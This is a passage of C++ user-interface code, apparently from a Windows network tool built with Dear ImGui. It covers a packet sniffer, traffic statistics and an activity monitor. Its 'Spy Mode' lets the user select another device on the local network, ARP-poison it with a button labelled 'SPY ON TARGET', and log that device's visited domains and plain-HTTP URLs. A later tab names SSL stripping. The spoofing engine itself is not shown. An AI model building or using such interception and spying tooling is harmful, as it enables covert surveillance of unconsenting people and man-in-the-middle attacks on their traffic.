    ImGui::TextColored(ColorDimCyan, "Time: %s", FormatDuration(g_sniffer.getCaptureDuration()).c_str());

    ImGui::Spacing();

    // Filter bar
    ImGui::TextColored(ColorDimWhite, "Filter:");
    ImGui::SameLine();
    
    const char* protocols[] = { "All", "TCP", "UDP", "ICMP", "ARP" };
    ImGui::SetNextItemWidth(80);
    ImGui::Combo("##proto", &g_filterProtocol, protocols, IM_ARRAYSIZE(protocols));
    ImGui::SameLine();
    
    ImGui::TextColored(ColorDimWhite, "IP:");
    ImGui::SameLine();
    ImGui::SetNextItemWidth(140);
    ImGui::InputText("##ipf", g_filterIp, sizeof(g_filterIp));
    ImGui::SameLine();

    ImGui::TextColored(ColorDimWhite, "Port:");
    ImGui::SameLine();
    ImGui::SetNextItemWidth(80);
    ImGui::InputText("##portf", g_filterPort, sizeof(g_filterPort));
    ImGui::SameLine(0, 20);
    ImGui::Checkbox("Auto-scroll", &g_snifferAutoScroll);

    ImGui::Spacing();
    ImGui::Separator();

    // Build filter struct
    SnifferFilter filter;
    if (g_filterProtocol > 0) filter.protocol = protocols[g_filterProtocol];
    filter.ipFilter = g_filterIp;
    filter.portFilter = (uint16_t)atoi(g_filterPort);

    // Get packets
    auto packets = g_sniffer.getPackets(filter, 500);

    // Determine split height: 60% packet table, 38% detail pane
    float availH = ImGui::GetContentRegionAvail().y;
    float tableH = availH * 0.60f;
    float detailH = availH * 0.38f;

    // Packet table — SizingFixedFit with explicit WidthFixed columns
    ImGuiTableFlags tFlags = ImGuiTableFlags_Borders | ImGuiTableFlags_RowBg | 
                              ImGuiTableFlags_Resizable | ImGuiTableFlags_ScrollY |
                              ImGuiTableFlags_SizingFixedFit;

    if (ImGui::BeginTable("PacketTable", 7, tFlags, ImVec2(0, tableH))) {
        ImGui::TableSetupColumn("#",       ImGuiTableColumnFlags_WidthFixed, 55.0f);
        ImGui::TableSetupColumn("Time",    ImGuiTableColumnFlags_WidthFixed, 75.0f);
        ImGui::TableSetupColumn("Source",  ImGuiTableColumnFlags_WidthFixed, 145.0f);
        ImGui::TableSetupColumn("Dest",    ImGuiTableColumnFlags_WidthFixed, 145.0f);
        ImGui::TableSetupColumn("Proto",   ImGuiTableColumnFlags_WidthFixed, 60.0f);
        ImGui::TableSetupColumn("Length",  ImGuiTableColumnFlags_WidthFixed, 60.0f);
        ImGui::TableSetupColumn("Info",    ImGuiTableColumnFlags_WidthStretch, 1.0f);
        ImGui::TableSetupScrollFreeze(0, 1);
        ImGui::TableHeadersRow();

        ImGuiListClipper clipper;
        clipper.Begin((int)packets.size());
        while (clipper.Step()) {
            for (int row = clipper.DisplayStart; row < clipper.DisplayEnd; row++) {
                const auto& pkt = packets[row];
                ImGui::TableNextRow();

                // Row color based on protocol
                ImVec4 rowColor = GetProtocolColor(pkt.protocol);
                bool isSelected = (g_selectedPacketIdx == (int)pkt.index);
                
                // Subtle row tint
                if (isSelected) {
                    ImGui::TableSetBgColor(ImGuiTableBgTarget_RowBg0, ImGui::GetColorU32(ImVec4(0.0f, 0.5f, 0.6f, 0.30f)));
                }

                // #
                ImGui::TableSetColumnIndex(0);
                char label[32];
                snprintf(label, sizeof(label), "%u", pkt.index);
                if (ImGui::Selectable(label, isSelected, ImGuiSelectableFlags_SpanAllColumns)) {
                    g_selectedPacketIdx = (int)pkt.index;
                }

                // Time
                ImGui::TableSetColumnIndex(1);
                ImGui::TextColored(ColorDimWhite, "%.4f", pkt.timestamp);

                // Source
                ImGui::TableSetColumnIndex(2);
                ImGui::TextColored(rowColor, "%s", pkt.srcIp.c_str());
                if (pkt.srcPort > 0) {
                    ImGui::SameLine(0, 0);
                    ImGui::TextColored(ColorDimWhite, ":%d", pkt.srcPort);
                }

                // Destination
                ImGui::TableSetColumnIndex(3);
                ImGui::TextColored(rowColor, "%s", pkt.dstIp.c_str());
                if (pkt.dstPort > 0) {
                    ImGui::SameLine(0, 0);
                    ImGui::TextColored(ColorDimWhite, ":%d", pkt.dstPort);
                }

                // Protocol
                ImGui::TableSetColumnIndex(4);
                ImGui::TextColored(rowColor, "%s", pkt.protocol.c_str());

                // Length
                ImGui::TableSetColumnIndex(5);
                ImGui::Text("%u", pkt.length);

                // Info
                ImGui::TableSetColumnIndex(6);
                ImGui::TextColored(ColorDimWhite, "%s", pkt.info.c_str());
            }
        }

        if (g_snifferAutoScroll && ImGui::GetScrollY() >= ImGui::GetScrollMaxY() - 20.0f) {
            ImGui::SetScrollHereY(1.0f);
        }

        ImGui::EndTable();
    }

    ImGui::Spacing();

    // Detail pane: show selected packet
    ImGui::BeginChild("PacketDetail", ImVec2(0, detailH), true);
    
    // Find selected packet
    const SniffedPacket* selPkt = nullptr;
    for (const auto& p : packets) {
        if ((int)p.index == g_selectedPacketIdx) { selPkt = &p; break; }
    }

    if (selPkt) {
        ImGui::TextColored(ColorCyan, "Packet #%u Detail", selPkt->index);
        ImGui::Separator();
        
        // Two columns: decoded + hex — use SizingFixedFit
        if (ImGui::BeginTable("DetailSplit", 2, ImGuiTableFlags_Resizable | ImGuiTableFlags_BordersInnerV | ImGuiTableFlags_SizingFixedFit)) {
            ImGui::TableSetupColumn("Decoded",  ImGuiTableColumnFlags_WidthFixed, 350.0f);
            ImGui::TableSetupColumn("Hex Dump", ImGuiTableColumnFlags_WidthStretch, 1.0f);
            ImGui::TableHeadersRow();

            ImGui::TableNextRow();
            
            // Decoded info
            ImGui::TableSetColumnIndex(0);
            ImGui::TextColored(ColorMagenta, "Protocol: %s", selPkt->protocol.c_str());
            ImGui::Text("Source:   %s", selPkt->srcIp.c_str());
            if (selPkt->srcPort) ImGui::Text("Src Port: %d", selPkt->srcPort);
            ImGui::Text("Dest:     %s", selPkt->dstIp.c_str());
            if (selPkt->dstPort) ImGui::Text("Dst Port: %d", selPkt->dstPort);
            ImGui::Text("Length:   %u bytes", selPkt->length);
            ImGui::Text("Time:     %.6f s", selPkt->timestamp);
            if (selPkt->tcpFlags) {
                std::string flags;
                if (selPkt->tcpFlags & 0x02) flags += "SYN ";
                if (selPkt->tcpFlags & 0x10) flags += "ACK ";
                if (selPkt->tcpFlags & 0x01) flags += "FIN ";
                if (selPkt->tcpFlags & 0x04) flags += "RST ";
                if (selPkt->tcpFlags & 0x08) flags += "PSH ";
                ImGui::TextColored(ColorYellow, "Flags: %s", flags.c_str());
            }
            ImGui::Spacing();
            ImGui::TextWrapped("Info: %s", selPkt->info.c_str());

            // Hex dump
            ImGui::TableSetColumnIndex(1);
            const auto& raw = selPkt->rawData;
            for (size_t i = 0; i < raw.size(); i += 16) {
                // Offset
                char line[128] = {};
                int pos = snprintf(line, sizeof(line), "%04X  ", (unsigned)i);
                
                // Hex bytes
                for (size_t j = 0; j < 16; ++j) {
                    if (i + j < raw.size())
                        pos += snprintf(line + pos, sizeof(line) - pos, "%02X ", raw[i + j]);
                    else
                        pos += snprintf(line + pos, sizeof(line) - pos, "   ");
                    if (j == 7) pos += snprintf(line + pos, sizeof(line) - pos, " ");
                }
                
                // ASCII
                pos += snprintf(line + pos, sizeof(line) - pos, " |");
                for (size_t j = 0; j < 16 && (i + j) < raw.size(); ++j) {
                    char c = (char)raw[i + j];
                    pos += snprintf(line + pos, sizeof(line) - pos, "%c", (c >= 32 && c < 127) ? c : '.');
                }
                pos += snprintf(line + pos, sizeof(line) - pos, "|");
                
                ImGui::TextColored(ColorDimCyan, "%s", line);
            }

            ImGui::EndTable();
        }
    } else {
        ImGui::TextColored(ColorDimWhite, "Select a packet above to view details and hex dump.");
    }
    
    ImGui::EndChild();
}

// ============================================================================
// Render: Tab 3 — TRAFFIC STATS
// ============================================================================
static void RenderTrafficStats() {
    // Update sniffer rates
    g_sniffer.updateRates();

    auto protoStats = g_sniffer.getProtocolStats();
    auto trafficStats = g_sniffer.getTrafficStats();

    // Top summary bar
    ImGui::TextColored(ColorCyan, "CAPTURE SUMMARY");
    ImGui::Separator();
    ImGui::Spacing();

    ImGui::Columns(4, "SummaryColumns", false);
    ImGui::TextColored(ColorDimWhite, "Total Packets");
    ImGui::TextColored(ColorWhite, "%u", g_sniffer.getTotalPacketCount());
    ImGui::NextColumn();
    ImGui::TextColored(ColorDimWhite, "Total Data");
    ImGui::TextColored(ColorWhite, "%s", FormatBytes(g_sniffer.getTotalBytes()).c_str());
    ImGui::NextColumn();
    ImGui::TextColored(ColorDimWhite, "Capture Rate");
    ImGui::TextColored(ColorWhite, "%.0f pkt/s", g_sniffer.getCaptureRate());
    ImGui::NextColumn();
    ImGui::TextColored(ColorDimWhite, "Duration");
    ImGui::TextColored(ColorWhite, "%s", FormatDuration(g_sniffer.getCaptureDuration()).c_str());
    ImGui::Columns(1);

    ImGui::Spacing();
    ImGui::Separator();
    ImGui::Spacing();

    // Protocol distribution (left side)
    ImGui::TextColored(ColorCyan, "PROTOCOL DISTRIBUTION");
    ImGui::Spacing();

    uint64_t totalProto = protoStats.total();
    if (totalProto > 0) {
        auto DrawBar = [&](const char* name, uint64_t count, ImVec4 color) {
            float pct = (float)count / (float)totalProto;
            ImGui::TextColored(color, "%-6s", name);
            ImGui::SameLine(70);
            
            // Draw colored bar
            ImVec2 pos = ImGui::GetCursorScreenPos();
            float barW = 300.0f * pct;
            ImGui::GetWindowDrawList()->AddRectFilled(
                pos, ImVec2(pos.x + barW, pos.y + 16),
                ImGui::GetColorU32(ImVec4(color.x, color.y, color.z, 0.6f)),
                3.0f);
            ImGui::GetWindowDrawList()->AddRect(
                pos, ImVec2(pos.x + 300.0f, pos.y + 16),
                ImGui::GetColorU32(ImVec4(color.x, color.y, color.z, 0.3f)),
                3.0f);
            ImGui::Dummy(ImVec2(310, 16));
            
            ImGui::SameLine();
            ImGui::Text("%llu (%.1f%%)", count, pct * 100.0f);
        };

        DrawBar("TCP",   protoStats.tcp,   ColorCyan);
        DrawBar("UDP",   protoStats.udp,   ColorGreen);
        DrawBar("ICMP",  protoStats.icmp,  ColorYellow);
        DrawBar("ARP",   protoStats.arp,   ColorMagenta);
        DrawBar("Other", protoStats.other,  ColorDimWhite);
    } else {
        ImGui::TextColored(ColorDimWhite, "No packets captured yet.");
    }

    ImGui::Spacing();
    ImGui::Separator();
    ImGui::Spacing();

    // Top Talkers
    ImGui::TextColored(ColorCyan, "TOP TALKERS (by traffic volume)");
    ImGui::Spacing();

    // Sort by total bytes
    struct TalkerEntry {
        std::string ip;
        uint64_t totalBytes;
        double rateIn, rateOut;
        const float* historyIn;
        int historyLen;
        int historyIdx;
    };
    std::vector<TalkerEntry> talkers;
    for (auto& [ip, stats] : trafficStats) {
        talkers.push_back({
            ip,
            stats.bytesIn + stats.bytesOut,
            stats.rateIn,
            stats.rateOut,
            stats.historyIn,
            TrafficStats::HISTORY_LEN,
            stats.historyIdx
        });
    }
    std::sort(talkers.begin(), talkers.end(), [](const TalkerEntry& a, const TalkerEntry& b) {
        return a.totalBytes > b.totalBytes;
    });

    ImGuiTableFlags talkerFlags = ImGuiTableFlags_Borders | ImGuiTableFlags_RowBg | 
                                   ImGuiTableFlags_ScrollY | ImGuiTableFlags_SizingFixedFit;

    if (ImGui::BeginTable("TalkersTable", 4, talkerFlags, ImVec2(0, 0))) {
        ImGui::TableSetupColumn("IP Address", ImGuiTableColumnFlags_WidthFixed, 140.0f);
        ImGui::TableSetupColumn("Total",      ImGuiTableColumnFlags_WidthFixed, 100.0f);
        ImGui::TableSetupColumn("DL Rate",    ImGuiTableColumnFlags_WidthFixed, 100.0f);
        ImGui::TableSetupColumn("Bandwidth",  ImGuiTableColumnFlags_WidthStretch, 1.0f);
        ImGui::TableSetupScrollFreeze(0, 1);
        ImGui::TableHeadersRow();

        int shown = 0;
        for (auto& t : talkers) {
            if (shown >= 15) break;
            ImGui::TableNextRow();

            ImGui::TableSetColumnIndex(0);
            ImGui::Text("%s", t.ip.c_str());

            ImGui::TableSetColumnIndex(1);
            ImGui::TextColored(ColorDimCyan, "%s", FormatBytes(t.totalBytes).c_str());

            ImGui::TableSetColumnIndex(2);
            ImGui::TextColored(ColorGreen, "%s", FormatRate(t.rateIn).c_str());

            // Mini sparkline
            ImGui::TableSetColumnIndex(3);
            if (t.historyIdx > 0) {
                float sparkData[TrafficStats::HISTORY_LEN];
                int len = (std::min)(t.historyIdx, t.historyLen);
                for (int i = 0; i < len; ++i) {
                    int idx = (t.historyIdx - len + i);
                    if (idx < 0) idx += t.historyLen;
                    sparkData[i] = t.historyIn[idx % t.historyLen];
                }
                ImGui::PlotLines("##spark", sparkData, len, 0, nullptr, 0.0f, FLT_MAX, ImVec2(150, 25));
            }

            shown++;
        }
        ImGui::EndTable();
    }
}

// ============================================================================
// Render: Tab 4 — ACTIVITY MONITOR + SPY MODE
// ============================================================================
static ImVec4 GetCategoryColor(const std::string& cat) {
    if (cat == "Social")       return ColorCyan;
    if (cat == "Streaming")    return ColorMagenta;
    if (cat == "Music")        return ImVec4(0.70f, 0.40f, 1.00f, 1.00f);
    if (cat == "Messaging")    return ColorYellow;
    if (cat == "Gaming")       return ColorGreen;
    if (cat == "Search")       return ImVec4(0.40f, 0.80f, 1.00f, 1.00f);
    if (cat == "Shopping")     return ColorOrange;
    if (cat == "Email")        return ImVec4(0.50f, 0.90f, 0.70f, 1.00f);
    if (cat == "Cloud")        return ImVec4(0.60f, 0.70f, 1.00f, 1.00f);
    if (cat == "News")         return ImVec4(0.90f, 0.80f, 0.50f, 1.00f);
    if (cat == "Ads/Tracking") return ColorRed;
    if (cat == "CDN")          return ColorDimWhite;
    if (cat == "Microsoft")    return ImVec4(0.40f, 0.70f, 1.00f, 1.00f);
    if (cat == "Apple")        return ImVec4(0.80f, 0.80f, 0.80f, 1.00f);
    return ImVec4(0.65f, 0.70f, 0.75f, 1.00f);
}

// Activity monitor state
static char g_activityIpFilter[64] = "";
static char g_activityDomainFilter[128] = "";
static int g_activityCategoryFilter = 0;

// Right-click detail popup state
static bool g_showUrlDetail = false;
static std::string g_detailIp;
static std::string g_detailDomain;
static std::string g_detailCategory;
static std::string g_detailMethod;
static std::string g_detailDestIp;
static uint64_t g_detailHits = 0;
static double g_detailFirstSeen = 0.0;
static double g_detailLastSeen = 0.0;
static std::vector<std::string> g_detailUrls;

// Spy Mode state
static bool g_spyModeActive = false;
static std::string g_spyTargetIp;
static std::string g_spyTargetMac;
static int g_spyDeviceIdx = -1;

struct ActivityRow {
    std::string ip;
    std::string domain;
    std::string category;
    std::string method;
    std::string destIp;
    uint64_t hits;
    double firstSeen;
    double lastSeen;
    std::vector<std::string> urls;
};

static void RenderUrlDetailPopup() {
    if (!g_showUrlDetail) return;
    
    ImGui::SetNextWindowSize(ImVec2(680, 500), ImGuiCond_FirstUseEver);
    ImGui::SetNextWindowPos(ImVec2(ImGui::GetIO().DisplaySize.x * 0.5f, ImGui::GetIO().DisplaySize.y * 0.5f),
        ImGuiCond_FirstUseEver, ImVec2(0.5f, 0.5f));
    
    std::string title = "URL Detail: " + g_detailDomain + "###UrlDetail";
    if (ImGui::Begin(title.c_str(), &g_showUrlDetail, ImGuiWindowFlags_NoCollapse)) {
        // Header info
        ImGui::TextColored(ColorCyan, "DOMAIN DETAIL");
        ImGui::Separator();
        ImGui::Spacing();
        
        // Info grid
        ImGui::TextColored(ColorDimWhite, "Source IP:");
        ImGui::SameLine(120);
        ImGui::TextColored(ColorWhite, "%s", g_detailIp.c_str());
        ImGui::SameLine(0, 10);
        if (ImGui::SmallButton("Copy IP")) {
            ImGui::SetClipboardText(g_detailIp.c_str());
        }

        ImGui::TextColored(ColorDimWhite, "Domain:");
        ImGui::SameLine(120);
        ImGui::TextColored(GetCategoryColor(g_detailCategory), "%s", g_detailDomain.c_str());
        ImGui::SameLine(0, 10);
        if (ImGui::SmallButton("Copy Domain")) {
            ImGui::SetClipboardText(g_detailDomain.c_str());
        }

        ImGui::TextColored(ColorDimWhite, "Dest IP:");
        ImGui::SameLine(120);
        ImGui::TextColored(ColorDimCyan, "%s", g_detailDestIp.empty() ? "N/A" : g_detailDestIp.c_str());

        ImGui::TextColored(ColorDimWhite, "Category:");
        ImGui::SameLine(120);
        ImGui::TextColored(GetCategoryColor(g_detailCategory), "%s", g_detailCategory.c_str());

        ImGui::TextColored(ColorDimWhite, "Method:");
        ImGui::SameLine(120);
        ImVec4 mc = ColorDimWhite;
        if (g_detailMethod == "SNI") mc = ColorGreen;
        else if (g_detailMethod == "DNS") mc = ColorCyan;
        else if (g_detailMethod == "HTTP") mc = ColorYellow;
        ImGui::TextColored(mc, "%s", g_detailMethod.c_str());

        ImGui::TextColored(ColorDimWhite, "Hit Count:");
        ImGui::SameLine(120);
        ImGui::Text("%llu", g_detailHits);

        ImGui::TextColored(ColorDimWhite, "First Seen:");
        ImGui::SameLine(120);
        ImGui::Text("%.2fs", g_detailFirstSeen);
        ImGui::SameLine(0, 15);
        ImGui::TextColored(ColorDimWhite, "Last Seen:");
        ImGui::SameLine();
        ImGui::Text("%.2fs", g_detailLastSeen);

        ImGui::Spacing();
        ImGui::Separator();
        ImGui::Spacing();

        // URL list
        ImGui::TextColored(ColorCyan, "CAPTURED URLs (%zu)", g_detailUrls.size());
        
        if (g_detailUrls.empty()) {
            ImGui::Spacing();
            if (g_detailMethod == "SNI") {
                ImGui::TextColored(ColorDimWhite, "HTTPS detected via TLS SNI — full path is encrypted.");
                ImGui::TextColored(ColorDimWhite, "Only the domain is visible: https://%s/", g_detailDomain.c_str());
                ImGui::Spacing();
                ImGui::TextColored(ColorDimWhite, "Tip: HTTP traffic shows full URLs with paths.");
            } else if (g_detailMethod == "DNS") {
                ImGui::TextColored(ColorDimWhite, "Detected via DNS lookup — no URL path available.");
                ImGui::TextColored(ColorDimWhite, "The device resolved this domain but may use HTTPS.");
            } else {
                ImGui::TextColored(ColorDimWhite, "No URLs captured yet for this domain.");
            }
        } else {
            ImGui::Spacing();
            
            // Copy All URLs button
            if (ImGui::Button("Copy All URLs")) {
                std::string all;
                for (auto& u : g_detailUrls) {
                    all += u + "\n";
                }
                ImGui::SetClipboardText(all.c_str());
            }
            ImGui::SameLine(0, 15);
            ImGui::TextColored(ColorDimWhite, "(%zu URLs)", g_detailUrls.size());
            
            ImGui::Spacing();

            // URL list with individual copy buttons
            ImGui::BeginChild("UrlList", ImVec2(0, 0), true);
            for (int i = (int)g_detailUrls.size() - 1; i >= 0; --i) {
                ImGui::PushID(i);
                
                // Copy button
                if (ImGui::SmallButton("Copy")) {
                    ImGui::SetClipboardText(g_detailUrls[i].c_str());
                }
                ImGui::SameLine();
                
                // Color based on http vs https
                ImVec4 urlColor = ColorYellow;
                if (g_detailUrls[i].find("https://") == 0) urlColor = ColorGreen;
                
                // Wrap long URLs
                ImGui::TextColored(urlColor, "%s", g_detailUrls[i].c_str());
                
                ImGui::PopID();
            }
            ImGui::EndChild();
        }
    }
    ImGui::End();
}

static void RenderActivityMonitor() {
    auto activityMap = g_sniffer.getActivityMap();

    float t = (float)ImGui::GetTime();

    // ======================= SPY MODE PANEL =======================
    ImGui::TextColored(ColorCyan, "ACTIVITY MONITOR");
    ImGui::SameLine(0, 30);

    if (!g_spyModeActive) {
        // Spy mode target selector
        ImGui::TextColored(ColorDimWhite, "Spy Target:");
        ImGui::SameLine();
        
        auto devices = g_arp.getDeviceList();
        // Build combo items
        static std::vector<std::string> deviceLabels;
        deviceLabels.clear();
        deviceLabels.push_back("-- Select Target --");
        for (auto& d : devices) {
            if (d.ip == g_arp.getGatewayIp()) continue;
            deviceLabels.push_back(d.ip + " (" + d.vendor + ")");
        }
        
        const char** items = new const char*[deviceLabels.size()];
        for (size_t i = 0; i < deviceLabels.size(); i++) items[i] = deviceLabels[i].c_str();
        
        ImGui::SetNextItemWidth(250);
        int sel = g_spyDeviceIdx + 1; // offset by 1 for the "-- Select --" entry
        if (ImGui::Combo("##spytarget", &sel, items, (int)deviceLabels.size())) {
            g_spyDeviceIdx = sel - 1;
        }
        delete[] items;

        ImGui::SameLine(0, 15);
        
        // SPY button
        ImGui::PushStyleColor(ImGuiCol_Button, ImVec4(0.8f, 0.0f, 0.3f, 0.9f));
        ImGui::PushStyleColor(ImGuiCol_ButtonHovered, ImVec4(1.0f, 0.1f, 0.4f, 1.0f));
        if (ImGui::Button("  SPY ON TARGET  ", ImVec2(160, 28)) && g_spyDeviceIdx >= 0) {
            // Find the selected device (skip gateway)
            int idx = 0;
            for (auto& d : devices) {
                if (d.ip == g_arp.getGatewayIp()) continue;
                if (idx == g_spyDeviceIdx) {
                    g_spyTargetIp = d.ip;
                    g_spyTargetMac = d.mac;

                    // Auto-poison the target
                    g_arp.startSpoofing(d.ip, d.mac);
                    g_arp.setDeviceFlags(d.ip, true, false, false, false);

                    // Auto-start capture if not running
                    if (!g_snifferStarted) {
                        if (g_sniffer.initialize(g_arp.getAdapterName(), g_arp.getLocalIp())) {
                            g_sniffer.startCapture();
                            g_snifferStarted = true;
                        }
                    }

                    // Set IP filter to target
                    strncpy(g_activityIpFilter, d.ip.c_str(), sizeof(g_activityIpFilter) - 1);
                    
                    g_spyModeActive = true;
                    break;
                }
                idx++;
            }
        }
        ImGui::PopStyleColor(2);
    } else {
        // SPY MODE ACTIVE indicator
        float pulse = sinf(t * 3.0f) * 0.3f + 0.7f;
        ImGui::TextColored(ImVec4(1.0f, pulse * 0.3f, pulse * 0.3f, 1.0f), "  SPY MODE ACTIVE");
        ImGui::SameLine(0, 15);
        ImGui::TextColored(ColorWhite, "Target: %s", g_spyTargetIp.c_str());
        ImGui::SameLine(0, 20);
        
        // Stop Spy button
        ImGui::PushStyleColor(ImGuiCol_Button, ImVec4(0.6f, 0.3f, 0.0f, 0.9f));
        ImGui::PushStyleColor(ImGuiCol_ButtonHovered, ImVec4(0.8f, 0.4f, 0.0f, 1.0f));
        if (ImGui::Button("  STOP SPY  ", ImVec2(120, 28))) {
            // Reset poison properly
            g_shaper.clearPolicy(g_spyTargetIp);
            g_arp.resetPoison(g_spyTargetIp);
            
            g_spyModeActive = false;
            g_spyTargetIp.clear();
            g_spyTargetMac.clear();
            g_spyDeviceIdx = -1;
            memset(g_activityIpFilter, 0, sizeof(g_activityIpFilter));
        }
        ImGui::PopStyleColor(2);
    }

    ImGui::SameLine(0, 30);
    size_t totalDevices = activityMap.size();
    size_t totalDomains = g_sniffer.getTotalDomainsDetected();
    ImGui::TextColored(ColorDimWhite, "Devices: %zu", totalDevices);
    ImGui::SameLine(0, 10);
    ImGui::TextColored(ColorDimWhite, "Domains: %zu", totalDomains);
    ImGui::SameLine(0, 10);

    if (!g_snifferStarted) {
        ImGui::TextColored(ColorRed, "[No Capture]");
    } else {
        ImGui::TextColored(ColorGreen, "[LIVE]");
    }

    ImGui::Spacing();

    // Filter bar
    ImGui::TextColored(ColorDimWhite, "IP:");
    ImGui::SameLine();
    ImGui::SetNextItemWidth(130);
    ImGui::InputText("##actip", g_activityIpFilter, sizeof(g_activityIpFilter));
    ImGui::SameLine(0, 10);
    
    ImGui::TextColored(ColorDimWhite, "Domain:");
    ImGui::SameLine();
    ImGui::SetNextItemWidth(180);
    ImGui::InputText("##actdom", g_activityDomainFilter, sizeof(g_activityDomainFilter));
    ImGui::SameLine(0, 10);

    const char* categories[] = { "All", "Social", "Streaming", "Music", "Messaging", "Gaming", "Search", "Shopping", "Email", "News", "Web", "Ads/Tracking" };
    ImGui::TextColored(ColorDimWhite, "Category:");
    ImGui::SameLine();
    ImGui::SetNextItemWidth(110);
    ImGui::Combo("##actcat", &g_activityCategoryFilter, categories, IM_ARRAYSIZE(categories));

    ImGui::Spacing();
    ImGui::Separator();
    ImGui::Spacing();

    // Build flat list of activities
    std::vector<ActivityRow> rows;

    std::string ipFilter(g_activityIpFilter);
    std::string domFilter(g_activityDomainFilter);
    for (auto& c : domFilter) c = (char)tolower((unsigned char)c);
    std::string catFilter = (g_activityCategoryFilter > 0) ? categories[g_activityCategoryFilter] : "";

    for (auto& [ip, ipAct] : activityMap) {
        if (!ipFilter.empty() && ip.find(ipFilter) == std::string::npos) continue;
        
        for (auto& [domain, act] : ipAct.activities) {
            if (!domFilter.empty() && domain.find(domFilter) == std::string::npos) continue;
            if (!catFilter.empty() && act.category != catFilter) continue;

            ActivityRow r;
            r.ip = ip;
            r.domain = act.domain;
            r.category = act.category;
            r.method = act.method;
            r.destIp = act.destIp;
            r.hits = act.hitCount;
            r.firstSeen = act.firstSeen;
            r.lastSeen = act.lastSeen;
            r.urls = act.urls;
            rows.push_back(std::move(r));
        }
    }

    std::sort(rows.begin(), rows.end(), [](const ActivityRow& a, const ActivityRow& b) {
        return a.lastSeen > b.lastSeen;
    });

    // Activity table
    ImGuiTableFlags tFlags = ImGuiTableFlags_Borders | ImGuiTableFlags_RowBg | 
                              ImGuiTableFlags_Resizable | ImGuiTableFlags_ScrollY |
                              ImGuiTableFlags_SizingFixedFit;

    if (ImGui::BeginTable("ActivityTable", 7, tFlags, ImVec2(0, -1))) {
        ImGui::TableSetupColumn("Source IP",  ImGuiTableColumnFlags_WidthFixed, 120.0f);
        ImGui::TableSetupColumn("Domain",     ImGuiTableColumnFlags_WidthStretch, 1.0f);
        ImGui::TableSetupColumn("Category",   ImGuiTableColumnFlags_WidthFixed, 90.0f);
        ImGui::TableSetupColumn("Method",     ImGuiTableColumnFlags_WidthFixed, 55.0f);
        ImGui::TableSetupColumn("URLs",       ImGuiTableColumnFlags_WidthFixed, 45.0f);
        ImGui::TableSetupColumn("Hits",       ImGuiTableColumnFlags_WidthFixed, 50.0f);
        ImGui::TableSetupColumn("Last Seen",  ImGuiTableColumnFlags_WidthFixed, 80.0f);
        ImGui::TableSetupScrollFreeze(0, 1);
        ImGui::TableHeadersRow();

        ImGuiListClipper clipper;
        clipper.Begin((int)rows.size());
        while (clipper.Step()) {
            for (int i = clipper.DisplayStart; i < clipper.DisplayEnd; i++) {
                const auto& r = rows[i];
                ImGui::TableNextRow();
                ImGui::PushID(i);

                ImVec4 catColor = GetCategoryColor(r.category);

                // IP
                ImGui::TableSetColumnIndex(0);
                ImGui::Text("%s", r.ip.c_str());

                // Domain — clickable, opens detail on right-click
                ImGui::TableSetColumnIndex(1);
                ImGui::TextColored(catColor, "%s", r.domain.c_str());
                
                // Right-click context menu
                if (ImGui::IsItemClicked(ImGuiMouseButton_Right)) {
                    g_showUrlDetail = true;
                    g_detailIp = r.ip;
                    g_detailDomain = r.domain;
                    g_detailCategory = r.category;
                    g_detailMethod = r.method;
                    g_detailDestIp = r.destIp;
                    g_detailHits = r.hits;
                    g_detailFirstSeen = r.firstSeen;
                    g_detailLastSeen = r.lastSeen;
                    g_detailUrls = r.urls;
                }
                // Tooltip hint
                if (ImGui::IsItemHovered()) {
                    ImGui::SetTooltip("Right-click for URL detail & copy options");
                }

                // Category
                ImGui::TableSetColumnIndex(2);
                ImGui::TextColored(catColor, "%s", r.category.c_str());

                // Method
                ImGui::TableSetColumnIndex(3);
                ImVec4 methodColor = ColorDimWhite;
                if (r.method == "SNI") methodColor = ColorGreen;
                else if (r.method == "DNS") methodColor = ColorCyan;
                else if (r.method == "HTTP") methodColor = ColorYellow;
                ImGui::TextColored(methodColor, "%s", r.method.c_str());

                // URL count
                ImGui::TableSetColumnIndex(4);
                if (!r.urls.empty()) {
                    ImGui::TextColored(ColorGreen, "%zu", r.urls.size());
                } else {
                    ImGui::TextColored(ColorDimWhite, "-");
                }

                // Hit count
                ImGui::TableSetColumnIndex(5);
                ImGui::Text("%llu", r.hits);

                // Last seen
                ImGui::TableSetColumnIndex(6);
                double ago = g_sniffer.getCaptureDuration() - r.lastSeen;
                if (ago < 2.0)
                    ImGui::TextColored(ColorGreen, "%.1fs", ago);
                else if (ago < 10.0)
                    ImGui::TextColored(ColorYellow, "%.0fs", ago);
                else
                    ImGui::TextColored(ColorDimWhite, "%.0fs", ago);

                ImGui::PopID();
            }
        }
        ImGui::EndTable();
    }

    // Render URL detail popup window (if open)
    RenderUrlDetailPopup();
}

// ============================================================================
// Render: Tab 5 — ADVANCED (Speed Test + Bandwidth Ranking + SSL Strip)
// ============================================================================
static bool g_sslStripStarted = false;
static int  g_advSubTab = 0;  // 0=SpeedTest, 1=BandwidthRank, 2=SSLStrip

// Right-click HTTP detail popup
static bool g_showHttpDetail = false;
static HttpCapture g_httpDetail;

static void RenderHttpDetailPopup() {
    if (!g_showHttpDetail) return;
    
    ImGui::SetNextWindowSize(ImVec2(700, 500), ImGuiCond_FirstUseEver);
    ImGui::SetNextWindowPos(ImVec2(ImGui::GetIO().DisplaySize.x * 0.5f, ImGui::GetIO().DisplaySize.y * 0.5f),
        ImGuiCond_FirstUseEver, ImVec2(0.5f, 0.5f));
    
    std::string title = "HTTP Detail ###HttpDetail";
    if (ImGui::Begin(title.c_str(), &g_showHttpDetail, ImGuiWindowFlags_NoCollapse)) {
        ImGui::TextColored(ColorCyan, "HTTP PACKET DETAIL");
        ImGui::Separator();
        ImGui::Spacing();

        auto& c = g_httpDetail;
        
        ImGui::TextColored(ColorDimWhite, "Source:");   ImGui::SameLine(110); ImGui::Text("%s:%d", c.srcIp.c_str(), c.srcPort);
        ImGui::TextColored(ColorDimWhite, "Dest:");     ImGui::SameLine(110); ImGui::Text("%s:%d", c.dstIp.c_str(), c.dstPort);
        
        if (!c.isResponse) {
            ImGui::TextColored(ColorDimWhite, "Method:");   ImGui::SameLine(110); ImGui::TextColored(ColorYellow, "%s", c.method.c_str());
            ImGui::TextColored(ColorDimWhite, "URL:");      ImGui::SameLine(110); ImGui::TextColored(ColorGreen, "%s", c.fullUrl.c_str());
            ImGui::SameLine(0, 10);
            if (ImGui::SmallButton("Copy URL")) ImGui::SetClipboardText(c.fullUrl.c_str());
            
            ImGui::TextColored(ColorDimWhite, "Host:");     ImGui::SameLine(110); ImGui::Text("%s", c.host.c_str());
